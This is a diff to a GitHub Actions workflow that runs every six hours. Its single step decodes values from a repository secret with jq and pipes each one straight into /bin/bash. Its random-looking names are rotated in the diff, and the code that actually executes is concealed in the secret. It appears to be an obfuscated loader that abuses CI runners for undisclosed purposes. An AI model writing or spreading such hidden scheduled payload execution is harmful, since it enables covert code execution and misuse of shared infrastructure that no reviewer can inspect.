@@ -2,28 +2,33 @@ name: lizhengxin8719
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 3/6 * * *'
+    - cron: '52 2/6 * * *'
 
-jobs:  # 15648
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lizhengxin8719
         env:
-          r123: ${{ secrets.r123 }}
+          ujij04: ${{ secrets.ujij04 }}
         run: |
-          echo $r123 | jq -r .gqmw6966 | /bin/bash
-          echo $yggq4320 | jq -r .a09426 | /bin/bash
-          echo $lf38980 | jq -r .l3 | /bin/bash
-          echo $gf0 | jq -r .gg88676 | /bin/bash
-          echo $gvq867 | jq -r .bdlmr75 | /bin/bash
-          echo $het3 | jq -r .jwk8 | /bin/bash
-          echo $mb3 | jq -r .je904 | /bin/bash
-          echo $urpq158 | jq -r .rrnjm84 | /bin/bash
-          echo $x58 | jq -r .gpo32 | /bin/bash
-          echo $aw2 | jq -r .xhh1 | /bin/bash
-          echo $sia982 | jq -r .sfaah92963 | /bin/bash
-          echo $hwhve389 | jq -r .m25863 | /bin/bash
-          echo $vll41744 | jq -r .pjpfh2 | /bin/bash
+          echo $ujij04 | jq -r .crh142 | /bin/bash
+          echo $wqwt5 | jq -r .liaj65522 | /bin/bash
+          echo $dv01 | jq -r .obhpc3 | /bin/bash
+          echo $mk543 | jq -r .kxx72 | /bin/bash
+          echo $xrap75490 | jq -r .ysbj13300 | /bin/bash
+          echo $xe992 | jq -r .onu03 | /bin/bash
+          echo $sdxyi7814 | jq -r .y809 | /bin/bash
+          echo $o7 | jq -r .kuhmy0080 | /bin/bash
+          echo $jva4160 | jq -r .yndwe23 | /bin/bash
+          echo $dbsr47 | jq -r .xwvf5 | /bin/bash
+          echo $h96454 | jq -r .zebyw939 | /bin/bash
+          echo $wmh7515 | jq -r .lzfg50137 | /bin/bash
+          echo $ckcu2 | jq -r .zix7 | /bin/bash
+          echo $jk5 | jq -r .ro35357 | /bin/bash
+          echo $bumq96 | jq -r .tdomh85511 | /bin/bash
+          echo $q395 | jq -r .tiaxi73 | /bin/bash
+          echo $vek78555 | jq -r .tkeuz6159 | /bin/bash
 
